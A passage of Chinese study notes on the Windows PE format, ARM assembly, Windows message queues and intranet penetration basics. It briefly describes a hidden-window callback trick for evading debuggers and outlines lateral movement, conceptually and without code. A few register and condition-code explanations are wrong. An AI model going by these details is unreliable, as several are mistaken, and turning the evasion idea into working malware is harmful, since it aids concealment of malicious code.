可选头（拓展头）的大小，这个头就在该结构体的后面。可以通过这个大小来判断32位（E0 00）和64位（F0 00）。 Characteristics 这个字段阐述了PE文件的属性，这个值是由众多的属性的值组合成的一个数字，看起来只有两个字节，但是包含了很多的二进制文件的属性。 IMAGE_OPTIONAL_HEADER 从这个块开始，就开始复杂了，就真正进入PE文件结构的核心了。 IMAGE_OPTIONAL_HEADER64 OptionalHeader; 为什么叫可选头，虽然他是必须的，没有就寄了。这是因为文件结构的设计是仿照的COFF文件，所以就传下来了这么一个不合理的名称。 这个头在64位和32位的程序中的结构不同（上面说了，大小不同，所以结构肯定不一样啊）。 这两个头合并成为PE文件头 typedef struct _IMAGE_OPTIONAL_HEADER { // // Standard fields. // WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; DWORD BaseOfData; // // NT additional fields. // DWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; // 64位的程序的结构 typedef struct _IMAGE_OPTIONAL_HEADER64 { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; ULONGLONG SizeOfStackReserve; ULONGLONG SizeOfStackCommit; ULONGLONG SizeOfHeapReserve; ULONGLONG SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64; Magic 文件类型标识，这个分开了PE32+文件（0x020b）,ROM文件（0x0170）,普通可执行文件（0x010b）。 MajorLinkerVersion 链接器的主版本号 MinorLinkerVersion 链接器的子版本号 SizeOfCode 所有的IMAGE_SCN_CNT_CODE的属性的代码的总大小，这是磁盘扇区字节数的整倍数计算，15353行 #define IMAGE_SCN_CNT_CODE 0x00000020 // Section contains code. 就是节区中包含可执行的代码的属性，相当于是可执行属性 AddressOfEntryPoint 程序执行入口RVA地址，一般指向运行时库代码，程序的main之类的入口点由这些库函数调用；在DLL文件中，这个值一般设置为0。 BaseOfCode 代码段的RVA地址，下面那个是数据段的代码段DataOfCode ImageBase 文件装入内存的首选地址，加载器会首先尝试在这个地址加载文件，加载成功就跳过装载器的重定位过程，如果这个地址在内存中被占用的话，装载器就会重新找一个合法的地址装载文件。 SizeOfImage 映像装入内存之后的大小，从ImageBase到最后一个区段的总大小 SizeOfHeaders 前面这些个各种头的总大小 CheckSum 映像文件的校验和，这个对于一般的文件没啥要求，一般就是0，但是对于内核模式的驱动和系统dll的这个值必须有这个合适的值 IMAGE_DATA_DIRECTORY #define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16 // 15047行 IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; PE文件中各种数据结构的索引目录，由数个结构相同的IMAGE_DATA_DIRECTORY组成 typedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; 在文件中是这么描述的 #define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory #define IMAGE_DIRECTORY_ENTRY_IMPORT 1 // Import Directory #define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 // Resource Directory #define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 // Exception Directory #define IMAGE_DIRECTORY_ENTRY_SECURITY 4 // Security Directory #define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table #define IMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory // IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 // (X86 usage) #define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data #define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP #define IMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory #define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory #define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers #define IMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table #define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors #define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor IMAGE_DIRECTORY_ENTRY_SECURITY 安全目录，一般用来存放数字签名或者证书之类的。 IMAGE_DIRECTORY_ENTRY_BASERELOC 基址重定位表，存放这一个偏移，是需要执行重定位的代码的偏移信息 IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 绑定输入目录，存储的是一些API绑定信息，这些可以加速程序的加载时间。 IMAGE_DIRECTORY_ENTRY_IAT 导入地址表，保存导入函数的真正地址 节表（区块表） 该表用来描述后面的这些个区段的各种属性，一个PE文件起码要一个节区才能跑，哪怕剩一个也得剩下text节区，连代码段都没了，跑尼玛呢。 该表由首位相连的数个结构相同的结构体构成 可以看到这个表的主要构成就是一堆IMAGE_SECTION_HEADER结构体构成，每一个结构体代表了之后的一个节区 IMAGE_SECTION_HEADER typedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; Name 这个字段就是阐述的该节的名称，一个8字节的字符串，开头一般都是.，如果用$开头的同名的区段会合并成一个区段。 VirtualSize 这个和PhysicalAddress字段在一个联合体中，在obj文件中他的值是0x00000000; 其他文件表示的是该节区实际被使用的区段大小（没有经过对齐）。 VirtualAddress 文件载入内存中的RVA，这个地址是按照页内存对齐的，永远是可选头中的SectionAlignment的整数倍。 SizeOfRawData 这个区段在文件中的占用磁盘的大小，按照页内存对齐的，永远是可选头中的FileAlignment的整倍数 PointerToRawData 该区段在文件中的偏移 PointerToRelocations 该区段重定位表的偏移，指向了IMAGE_RELOCATION结构数组 IMAGE_RELOCATION typedef struct _IMAGE_RELOCATION { union { DWORD VirtualAddress; DWORD RelocCount; // Set to the real count when IMAGE_SCN_LNK_NRELOC_OVFL is set } DUMMYUNIONNAME; DWORD SymbolTableIndex; WORD Type; } IMAGE_RELOCATION; typedef IMAGE_RELOCATION UNALIGNED *PIMAGE_RELOCATION; Characteristics 阐述了区段的一些属性，比如读写情况和其他状态。这些属性有些事可以合并的，在程序中可以通过|来合并属性 区段的命名 区段名称可以自定义，但是一般是使用默认的区段名称。 可以通过如下形式对程序中的数据段进行改名。 #pragma data_seg(\"任意的名字\"); 区段的对齐 在文件中不论是什么内容，都要遵守一个页对齐的规则。对于PE文件来说，只要是2的倍数就可以 以text区段为例 看到这个段的VirtualSize是0x1d18，然后再看VirtualAddress和SizeOfRawData这两个字段 VirtualAddress：0x1000 所以这个区段在内存中的大小应该是0x2000，缺的字节用0x00补齐。用x64dbg可以证明： SizeOfRawData：0x1E00 根据上述大小，这个区段在硬盘中的大小应该是0x1E00的整倍数，所以理论上应该是0x1E00。 后续： 根据书上介绍，后面的内容都会教你如何定位，但是现在的CFF，PE studio这么方便，没必要再去研究怎么手动定位了。 IMAGE_EXPORT_DIRECTORY（导出表） 在头文件的16148行找到了这个结构体的描述 typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; //默认是0，作为保留值 DWORD TimeDateStamp; //导出表创建时间 WORD MajorVersion; WORD MinorVersion; DWORD Name; //指向模块的名称的RVA地址 DWORD Base; DWORD NumberOfFunctions; //导出地址表（EAT）中成员个数 DWORD NumberOfNames; //导出名称表（ENT）中成员个数 DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 导出表主要是存放的程序的导出函数，exe文件一般没有这个表，普遍存在dll文件中。 不知道为啥，这个资料用了很大的章节来阐述如何定位到导出表……， 导出表在逻辑上分为三部分：名称表；序号表；函数表。 调用者通过前两者进行索引，找到真正的函数表。我们平时调用dll时用到的序号，需要减去DWORD Base;的值才能得到真正的保存的序号。但是不知道这个有什么实际用处 IMAGE_IMPORT_DIRECTORY（导入表） 这个表是重要的一个表。这个表存在的意义是：该程序调用第三方API函数供本地使用的调用机制。这个表普遍存在于PE文件中。 typedef struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; // 0 for terminating null import descriptor DWORD OriginalFirstThunk; // 输入表名称（INT）的RVA } DUMMYUNIONNAME; DWORD TimeDateStamp; // 0 if not bound, // -1 if bound, and real date\\time stamp // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND) // O.W. date/time stamp of DLL bound to (Old BIND) DWORD ForwarderChain; // -1 if no forwarders DWORD Name; // 指出导入此映像文件的名字 DWORD FirstThunk; // RVA to IAT (if bound this IAT has actual addresses) } IMAGE_IMPORT_DESCRIPTOR; 该结构并不能完成PE文件整个的导入文件，只是帮助装载器找到程序真正的保存有导入信息的结构。真正保存导入函数的是如下两个结构体_IMAGE_IMPORT_BY_NAME和_IMAGE_THUNK_DATA。16166行 typedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; CHAR Name[1]; } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; typedef struct _IMAGE_THUNK_DATA64 { union { ULONGLONG ForwarderString; // 转发字符串的RVA ULONGLONG Function; // 被导出函数的地址 ULONGLONG Ordinal; ULONGLONG AddressOfData; // PIMAGE_IMPORT_BY_NAME } u1; } IMAGE_THUNK_DATA64; typedef struct _IMAGE_THUNK_DATA32 { union { DWORD ForwarderString; // PBYTE DWORD Function; // PDWORD DWORD Ordinal; DWORD AddressOfData; // PIMAGE_IMPORT_BY_NAME } u1; } IMAGE_THUNK_DATA32; IMAGE_IMPORT_DIRECTORY结构的个数由导入函数的数量决定，最后以一个空的IMAGE_IMPORT_DIRECTORY结构结尾 这个实例程序中只有两个结构，一个是kernel32的一个是msvcrt的 包含最后一个空结构： OriginalFirstThunk 包含指向INT的RVA，INT就是一个_IMAGE_THUNK_DATA类型的数组，结尾是一个空的_IMAGE_THUNK_DATA结构体；一般情况下，每一个_IMAGE_THUNK_DATA结构会指向_IMAGE_IMPORT_BY_NAME结构。 _IMAGE_IMPORT_BY_NAME结构体 typedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; // 导入表需要导入的函数的符号 CHAR Name[1]; // 导入表需要导入的函数的名称 } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; 该结构最后也是一个全空的结构体结尾， FirstThunk 指向导入地址表（IAT）的RVA地址 异常 异常目录常用来存放用于描述异常处理的相关的异常处理函数、SEH相关的地址等信息，这些信息一般位于pdata区段中。 PE文件结构中的异常目录目前只在： X64 ARMv7 ARM MIPS PowerPC 这些平台上才有实际作用。 在16551行可以找到这个结构体的描述 typedef struct _IMAGE_RUNTIME_FUNCTION_ENTRY { DWORD BeginAddress; // SEH代码起始地址 DWORD EndAddress; // SEH代码的结束地址 union { DWORD UnwindInfoAddress; DWORD UnwindData; } DUMMYUNIONNAME; } _IMAGE_RUNTIME_FUNCTION_ENTRY, *_PIMAGE_RUNTIME_FUNCTION_ENTRY; 安全 数据目录的IMAGE_DIRECTORY_ENTRY_SECURITY指向这个结构。这个目录也被称为“安全目录”或者“属性证书目录”，一般存放的是文件的数字签名。 安全目录结构 在wintrust.h文件中1398行可以找到描述 typedef struct _WIN_CERTIFICATE { DWORD dwLength; // 当前结构体的长度 WORD wRevision; // 签名的版本号 WORD wCertificateType; // WIN_CERT_TYPE_xxx BYTE bCertificate[ANYSIZE_ARRAY]; // 包含了许多证书 } WIN_CERTIFICATE, *LPWIN_CERTIFICATE; 基质重定向表 在运行的时候，总是exe文件被优先加载，所以这个表普遍存在于dll文件中，当exe文件或者其他文件运行占据了dll的默认地址，就会进行重定向。 一般情况下.reloc的段中存在这个基址重定位表；将PE文件中所有需要重定位的地址放在一个数组里。 IMAGE_BASE_RELOCATION typedef struct _IMAGE_BASE_RELOCATION { DWORD VirtualAddress; DWORD SizeOfBlock; // WORD TypeOffset[1]; } IMAGE_BASE_RELOCATION; 在一个PE文件中，重定位结构由众多的上述结构组成。根据书上说：每个这个结构管理的只有4kb大小的分页内的重定位信息，PE文件中每隔0x1000字节的大小就需要一个这个结构与其对应，所以这个结构中的VirtualAddress的值永远是0x1000的倍数。 调试 数据结构目录中的IMAGE_DIRECTORY_ENTRY_DEBUG结构指向了这个结构，该结构也被成为是调试目录，一般保存在.debug区段中。 IMAGE_DEBUG_DIRECTORY typedef struct _IMAGE_DEBUG_DIRECTORY { DWORD Characteristics; // 保留字段 DWORD TimeDateStamp; // 调试数据建立的时间和日期 WORD MajorVersion; WORD MinorVersion; DWORD Type; DWORD SizeOfData; DWORD AddressOfRawData; // 加载到内存的调试数据RVA DWORD PointerToRawData; // 调式数据的文件偏移 } IMAGE_DEBUG_DIRECTORY, *PIMAGE_DEBUG_DIRECTORY; 这个结构体不是很严格，在type里可以自定义一些类型，但是我也没有实际操作，所以我不清楚这个节区具体有什么用处 TLS 见另一笔记，本篇只用来记录PE结构的一些内容。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-02-13 15:26:36 "},"MyArticles/Basics/arm学习.html":{"url":"MyArticles/Basics/arm学习.html","title":"ARM 基础学习","keywords":"","body":"精简指令集 RISC ARM属于精简指令集，大约100条左右的指令，先比较于x86汇编，arm不能直接操作内存的加减，只能控制寄存器，所以需要将内存ldr到寄存器中进行操作后返回内存。 比x86（CISC）快 RISC指令集允许通过缩短时钟周期来加速代码执行 端序 arm3之前小端序，之后的架构支持大端序，可以手动设置，而x86和x64仅仅支持小端序。 ARM 基本特性 特权模式 1、不同于x86架构的r0内核模式和r3用户模式，arm提供了更多的特权模式（命名用的是英文的缩写）。 USR：用户模式 ---> R3：用户运行的层级 FIQ：快速中断请求模式 IRQ：中断请求模式 SVC：管理模式（supervisor） ---> R0：一般操作系统内核运行的层级 MON：监视模式 ABT：终止模式 UND：未定义指令模式 SYS：系统模式 thumb 都属于arm架构，只不过是指令的长度不同，一个arm程序中可以混用两种指令长度的模式，只需要在汇编代码后面标注就可以。 ARM指令为32位、Thumb为16或者32位。 执行状态选择 0、默认状态下是ARM模式，直到出现显示或者隐式的转换。 1、利用BX、BXL进行跳转的时候，目标寄存器最低位是1（奇数），会切换到thumb模式。 2、程序状态寄存器（CPSR）的T标志位被置起，则切换到thumb模式。 3、32位的thumb指令后面用.W进行标注。 版本问题 thumb-1 用于ARM v6及之前的体系结构，ARM v7只用thumb-2. 条件执行 arm支持 条件执行 ：在指令中编码了算数条件，满足条件才会执行。 优点： 提高了代码密度 减少执行指令的数目 ARM 的每一个指令都支持 条件执行 ，但是默认都是无条件执行的。 桶式位移器 相当于指令的合并操作，在一个指令中包含多步操作。 MOV R1, R0, LSL #1 ;将r0寄存器左移一位后，传递给r1 运行ARM程序 运行 ubuntu1804环境，成功安装qemu，执行显示缺少ld-linux.so.3文件，通过命令 sudo find / -name \"ld-linux.so.3\" 找到对应的so文件，然后使用命令 qemu-arm -L /usr/arm-linux-gnueabihf/lib/ call_ret 运行arm文件。 或者编译的时候直接使用-static静态编译可以解决问题 避免每次运行的时候使用qemu-***的形式，可以下载 apt install binfmt* 调试 使用gdb远程调试的原理，先本机开一个运行端口，然后gdb远程访问。 数据类型 & 寄存器 ARM 的操作都是基于寄存器的操作，无法像x86那样可以直接操作内存中的内容。 换算 32bit = 4byte = 1word = 1/2dword。 16bit = 半字（half word），不知道为啥会单独出一个半字的数据类型。 16bit：扩展后缀为-h或者-sh对应着， byte：-b或者-sb对应着字节 ldr = 加载字，宽度四字节 ldrh = 加载无符号的半字，宽度两字节 ldrsh = 加载有符号的半字，宽度两字节 ldrb = 加载无符号的字节 ldrsb = 加载有符号的字节 str = 存储字，宽度四字节 strh = 存储无符号的半字，宽度两字节 strsh = 存储有符号的半字，宽度两字节 strb = 存储无符号的字节 strsb = 存储有符号的字节 寄存器 定义了16个32bit通用寄存器（R0-R15）r0一般也用来放返回值，最后三个有特殊用处，0-12是通用的。 r11：栈帧寄存器 栈帧寄存器，相当于是rbp r13：栈寄存器 栈指针寄存器，SP。相当于x86架构中的rsp寄存器，永远指向栈顶端。 r14：连接寄存器 连接寄存器，LR。在函数调用中保存返回地址。在BL的时候会把返回地址保存在这个寄存器中，x86会保存在栈顶。 r15：计数寄存器 程序计数寄存器，每次执行一个+8或者+4，类似于rip指令，但是他是支持arm程序直接读写的，并且会执行并跳转，也就是说他并不会一直指向下一条指令， CPSR：程序状态寄存器 类似于x86里的EFLAG或者RFLAG寄存器，保存程序的一些状态。 E 大小端标志位，0-->小端 T thumb标志位，thumb状态为1 M 模式标志位，确定当前特权模式。 系统级控制设置 arm利用 协处理器 来支持额外的指令和系统级设置。 以 MMU（内存 管理 单元） 为例。如果系统是支持的，那么就要要向内核或者启动代码提供对应的接口，在x86架构中，这些接口会放在CR0-CR4寄存器中。 在ARM中， 有16个协处理器，CP0-CP15（P0-P15），每个协处理器有16个寄存器和对应的8个操作码。 协处理器只能通过MRC读和MCR写这俩指令来访问。这俩指令的参数一般是编号的形式，例如：读出转换基址寄存器并保存到CR0中。读出p15中的c2和c0保存在r0中。 这些东西常用在固件中，或者嵌入式开发之类的。 MRC p15, 0, r0, c2, c0, 0 x86中的控制寄存器 CPU架构中共有CR0、CR1、CR2、CR3、CR4、CR8共6个控制寄存器，如下图。 CR0：包含当前处理器运行的控制标志。 CR1：保留。 CR2：包含发生页面错误时的线性地址。 CR3：页面目录表（Page Directory Table）的物理地址。 CR4：包含处理器扩展功能的标志位。 CR8：提供对任务优先级寄存器（Task Priority Register）的读写（仅在64位模式下存在）。 对控制寄存器的读写是通过MOV CRn指令来实现。 ARM 指令集 1、连续横杠间断逗： PUSH {R11,LR} ;将R11和LR寄存器的值push到栈中。 PUSH {R11,R15} ;将R11 到 R15中的值push到栈中。 2、更新基址用叹号： STM R1, {R3-R10} ; R1 = 数组 STM R1!, {R3-R10} ; R1 = 数组+1，将R1的地址更新为R10元素之后的一个 数据加载 & 保存 LDR & STR ldr：从内存向寄存器中加载数据 str：从寄存器中向内存加载数据 从内存中加载和保存1，2，4字节的数据。 LDR R3, [R0] ;取R0地址里的内容给R3寄存器指向的地址 -- R3 = *R0 STR R3, [R0] ;取R3寄存器的值给R0指向的地址 -- R0 = *R3 这里也涉及到了ARM中的9种寻址方式。 立即寻址 寄存器寻址 寄存器间接寻址 寄存器移位寻址 基址变址寻址 相对寻址 多寄存器寻址 堆栈寻址（块拷贝寻址） 实际运用的时候不需要直到是什么方式寻址，能看懂就行了。 LDM & STM 这个和上面的指令一样，区别是操作的数据大小不同，r结尾的是1，2，4字节，m结尾的是操作数据块。 存在四种模式： IA：后递增，写回最后一个地址+4字节地址的地址。 IB：前递增，把数据存储在基地址+4的地址，写回最后一个地址。 DA：后递减，最后的地址是基地址，写回最低地址-4。 DB：前递减：最后的地址是基地址-4，写回最低地址。 类似于x86架构下的rep和movs指令，比如c语言里的memcpy（有时会直接以内联汇编的形式将其附加到代码中，而不是显示的调用这个函数）的功能。 push & pop 这俩个x86架构下的没啥区别，就是x86一般一次一个，这个可以push很多一起进栈。一般用作函数边界的确定。 函数调用 函数调用涉及到了 局部变量 分支跳转 每一次跳转都可以选择thumb和arm 返回值 默认使用r0寄存器 返回地址 可以用栈也可以用LR寄存器，但是用栈的话需要显示的将地址pop到PC寄存器中，否则默认LR寄存器。 调用约定 前4个32位参数放到r0-r3寄存器，其余的用栈。 这几个方面的内容。 跳转指令 B：branch 1、很少遇到的一种无条件跳转，类似于jmp指令。通常用于循环或者判断中，或者调用永不返回的函数 2、只能使用偏移量（当前地址）作为参数，不能跳转寄存器,b R0是非法的 BX：branch exchange 跳转并交换，可以在跳转的时候选择arm或者thumb模式（X结尾的指令），根据目标地址最低位是不是1确定。可以用来跳转寄存器BX R0是合法的。 BX LR 类似于 RET指令 BL：branch and link 跳转并连接指令，类似于call指令，在跳转之前先将返回地址保存到LR寄存器中。 作用和B指令一样，只能跳偏移，不能跳寄存器 BLX：branch linke exchange 如果目的地在32mb之内，使用BL指令较多，跳转地址未知或者不确定，使用BLX指令 arm下调用库函数使用BL thumb下调用库函数使用BLX 计算 LSL , (LSR ASR)：左移和右移 ROR , ROL：循环左右移 ADD , SUB：加减 MUL,：乘法，arm中没有原生除法。会截断结果为32位 AND , ORR , EOR：与或非 分支跳转 & 条件执行 主要依赖于一些标志寄存器的值，记不住，到时候现查就行。 一些后缀编码 EQ = Z==1 NE != Z==0 MI - N==1 PL +, 0 N==0 HI unsigned > C==1 && Z==1 LS unsigned C==0 \\ \\ Z==1 GE >= N=V LT N!=V GT > Z==0 && N=V LE Z==1 \\ \\ N!=V 跳真不跳假。比如BLT这个指令：如果LT为真，则跳转。默认情况下不会更新标志位，除非使用了S后缀。 比较指令会自动更新标志位。 JIT和SMC just-in-time：即时编译 SMC：自修改代码（逆向中的一种反调试技巧）。 arm支持这些玩意。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-23 14:55:58 "},"MyArticles/Basics/Windows消息队列学习.html":{"url":"MyArticles/Basics/Windows消息队列学习.html","title":"Windows消息队列","keywords":"","body":"一、消息队列 消息队列是在什么时候创建的？ 在线程被第一次创建的时候，当线程第一次被创建时，系统假设他不会被用于与任何用户界面所相关的任务，这样可以有效减少系统资源的使用。当检测到他调用一个和与图形相关的函数的时候，系统为他分配额外的资源 Windows下的应用是基于事件驱动的，他等待系统向其传递输入；dos程序是顺序的、过程驱动的。 Windows消息传递的过程： 用户或应用程序的某些行为会产生一些事件。操作系统找到事件所属的应用程序，然后向该应用程序发送条相应的消息。然后，该消息就被加入到该引用程序的消息队列中。之后，应用程序不断地检杳消息队列，每当接收到一条消息时，应用程序就将该消息分发给与该消息所属窗口相关的窗口过程。最后，窗口过程执行与当前消息对应的指令。 Windows消息队列： Windows操作系统的内核空间中有一个系统消息队列（system message queue），在内核空间中还为每个UI线程分配各自的线程消息队列(Thread message queue)。在发生输入事件之后，Windows操作系统的输入设备驱动程序将输入事件转换为一个“消息”投寄到系统消息队列；操作系统的一个专门线程从系统消息队列取出消息，分发到各个UI线程的输入消息队列中。 Windows的事件驱动模式，并不是操作系统把消息主动分发给应用程序；而是由应用程序的每个UI线程通过“消息循环”代码从UI线程消息队列获取消息 Windows为什么使用句柄： 为什么说句柄是一种指向指针的指针。 由于windows是一种以虚拟内存为基础的操作系统，其内存管理器经常会在内存中来回的移动对象，以此来满足各种应用程序对内存的需求。而对象的移动意味着对象内存地址的变化，正是因为如此，如果直接使用指针，在内存地址被改变后，系统将不知道到哪里去再调用这个对象。windows系统为了解决这个问题，系统专门为各种应用程序腾出了一定的内存地址（句柄）专门用来记录这些变化的地址（这些内存地址就是指向指针的指针），这些内存地址本身是一直不变化的。windows内存管理器在移动某些对象之后，他会将这些对象新的内存地址传给句柄，告诉他移动后对象去了哪里 死锁：Message Deadlocks 原因：发送的消息被处理时被”丢弃”了，而发送与接收的线程是同一队列，这就会导致该线程”死”了。 其实可以看做一个相互等待的场景： a线程发消息1给b线程 b线程处理消息1，回调函数中发了消息2给a a接到消息2，但因为b对消息1的处理结果还没回来而等待 b因为消息2的处理结果还没回来而等待 二、相关API postMessage //消息进入消息队列中后立即返回，消息可能不被处理。 PostThreadMessage //消息放入指定线程的消息队列中后立即返回，消息可能不被处理。 SendMessage //消息进入消息队列中，处理后才返回，如果消息不被处理，发送消息的线程将一直处于阻塞状态，等待消息返回。 SendNotifyMessage//如果消息进入本线程，则为SendMessage()，不是则采取postMessage()，当目标线程仍然依send处理 SendMessageTimeout //消息进入消息队列，处理或超时则返回，实际上SendMessage()就是建立在该函数上的 SendMessageCallback //在本线程再指定一个回调函数，当处理完后再次处理 BroadcastSystemMessage //发送目标为系统组件，比如驱动程序 windows编程 c语言的程序至少有一个主函数main，Windows编程中存在两个主函数 int WINAPI WinMain( HINSTANCE hInstance, // handle to current instance HINSTANCE hPrevInstance, // handle to previous instance LPSTR lpCmdLine, // pointer to command line int nCmdShow // show state of window ); LRESULT CALLBACK WindowProc( HWND hwnd, // handle to window UINT uMsg, // message identifier WPARAM wParam, // first message parameter LPARAM lParam // second message parameter ); 第二个是个callback函数，Windows必须至少一个callback函数 第一个winmain函数用来从消息队列中不断的发现消息，并处理消息（发送给对应的窗口函数） MSG msg; //定义消息名 while (GetMessage (&msg, NULL, 0, 0)) { TranslateMessage (&msg) ; //翻译消息 DispatchMessage (&msg) ; //撤去消息 } return msg.wParam; 关于msg的结构定义，Windows中绝大多数都是基于结构体的体系。 typedef struct tagMSG { // msg HWND hwnd; // 要将消息发送到的目标句柄 UINT message; // 一个消息数字，对应一个消息类型 WPARAM wParam; LPARAM lParam; DWORD time; // 消息放入队列的时间（相对于Windows的时间，不是物理时间） POINT pt; // 消息放队列的鼠标位置 } MSG; sendmessage和postmessage 前者发送消息之后需要等到返回才能返回、后者发送之后直接返回，不需要等待。 因为前者直接调用WndProc消息处理函数，所以需要等待返回之后才能返回。 后者是直接把消息放到消息队列中，所以可以直接返回。 三、实际运用 在开发层面运用很多，可以手动创建窗口，也可以利用MFC或者是利用其他的现成的框架。 细节 程序调用CreateWindowEx函数，将窗口的样式被设置成为WS_EX_TOOLWINDOW，该属性的窗口有以下特点： 不在任务栏显示。 不显示在Alt+Tab的切换列表中。 在任务管理器的窗口管理Tab中不显示。 相当于创建了一个隐形窗口。通过消息机制调用回调函数实现创建子程序，利用回调函数可以自己根据消息执行的特点，可以规避调试。 文章https://www.anquanke.com/post/id/176079#h2-7既没有给出hash，图片还寄了，但是提供了一种恶意代码执行的思路，类似于Windows进程注入中的回调注入方式。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-12 14:08:16 "},"MyArticles/Basics/内网基础.html":{"url":"MyArticles/Basics/内网基础.html","title":"内网基础学习 - 域和组","keywords":"","body":"[TOC] 内网渗透 - 介绍 在拿到目标服务器的控制权后，通过一些内网技术比如：信息收集、内网代理、权限提升和横向移动这些技术，对目标的内网环境进行渗透，最终拿到内网里面其他主机（域控制器和运维主机等等）的权限。 内网环境 学习之前先学习内网中的一些工作环境。 一、工作组（Work Group） Windows自带的一个团队组织方式，可以按照不同的要求将一群计算机分到不同的组中，相当于是对主机的一个分类，让组织的网络更具有层次性。 这样只需要在“网上邻居”中找到对应的工作组，就可以发现里面的所有计算机和访问该组中的一些资源。 二、域（Domain） 这个是相对于“组”的一个拓展。更高级的主机资源管理模式，少也合适，多也合适的模式 1、组的缺点 通过组来对主机进行划分适合资产较小或者计算机数量较少且对安全管理控制不用很严格的情况下。 工作组没有中心化的用户与权限管理。每台计算机的用户和权限需单独管理,不利于统一管理和控制,所以不适合资产较大或者计算机数量较多的环境。 工作组模式下计算机之间的文件和打印机共享需要单独配置,较为麻烦,且安全控制较弱。这在计算机数量较多的环境下管理代价和安全风险都较大。 工作组没有活动目录,用户登录身份与配置文件只能局限在每台计算机内。这使得用户使用体验较差,且不利于集中的管理和控制。 工作组下无法实现细粒度的权限控制和安全策略,系统文件和服务缺乏集中化的安全基线和修补管理。这使得工作组环境下的安全性较差。 工作组模式没有系统日志集中化管理功能,事件日志记录在每台计算机内,不利于相关事件的关联分析和审计,带来一定的安全隐患。 在一个域中，一些安全主体都在一个或者多个域控制器的中央数据库中注册，当域用户需要想访问域中的资源时，必须先通过域控制器进行身份验证。 域用户在域中的身份决定了域用户对域中的资源有啥样的访问权限。 一些常见安全主体： 用户账户 用户组 计算机 打印机 ……………… 2、分类 域拥有常见的四种组织方式： 单域 父域和子域 域树 域林 a . 单域 网络环境中只有一个域，适合计算机数量少、地理位置固定的小规模组织中。 b . 父域和子域 在一个域中划分出多个域，被划分的域称为父域，划分出来的域称为子域。比如一个部门在不同的地理位置，就可以把不同的分公司放到不同的子域，部门通过不同的域来管理自己的资源，同时可以拥有自己的安全策略。从命名上看，就是往前加多级域名。 c . 域树 多个域通过信任关系组建成的域集合，所有的域共享同一表结构和配置，所有的域名形成一个连续的名字空间。 